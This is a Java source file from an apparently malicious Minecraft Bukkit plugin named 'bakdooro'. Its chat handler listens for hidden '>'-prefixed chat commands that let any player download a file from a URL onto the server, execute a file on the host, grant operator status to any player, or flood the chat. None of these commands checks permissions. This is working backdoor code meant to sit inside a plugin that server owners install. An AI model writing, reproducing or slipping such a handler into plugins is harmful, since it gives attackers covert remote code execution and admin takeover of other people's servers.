package me.acaiberii.bakdooro.util.handler;

import me.acaiberii.bakdooro.game.server;
import org.bukkit.entity.Player;

import java.io.IOException;
import java.util.Objects;

public class chathandler {
    public static void handler(Player pl, String message) {
        if (message.startsWith(">")) {
            if (message.equals(">fillchat")) {
                me.acaiberii.bakdooro.exp.exploits.chatFill();
            } else if (message.startsWith(">download")) {
                String[] spl = message.split(":");
                if (spl.length < 3) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >download:(URL):(OUTPUT)");
                }
                else {
                    me.acaiberii.bakdooro.exp.exploits.remoteDownload(spl[1], spl[2]);
                }
            }
            else if (message.startsWith(">op")) {
                String[] spl = message.split(":");
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >op:(PLAYER)");
                }
                else {
                    me.acaiberii.bakdooro.exp.exploits.remoteOp(Objects.requireNonNull(server.srv.getPlayer(spl[1])));
                }
            }
            else if (message.startsWith(">exec")) {
                String[] spl = message.split(":");
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >exec:(FILEPATH)");
                }
                else {
                    me.acaiberii.bakdooro.exp.exploits.remoteExec(Objects.requireNonNull(spl[1]));
                }
            }
            else {
                pl.sendMessage("Unknown command. Try again.");
            }
        }
    }
}